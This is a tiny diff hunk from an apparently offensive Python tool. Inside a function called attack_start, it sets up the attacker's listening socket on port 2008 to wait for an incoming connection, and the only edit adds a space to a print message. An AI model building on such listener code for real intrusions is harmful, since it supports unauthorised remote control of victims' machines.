@@ -13,7 +13,7 @@ def attack_start():
     s.connect(('10.0.0.0', 0))
     IPAttacker = s.getsockname()[0]
     PortAttacker = 2008
-    print("[+] Waiting for incoming connection ...")
+    print("[+] Waiting for incoming connection ... ")
     # Start
     AttackerConnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     AttackerSocket = (IPAttacker, PortAttacker)
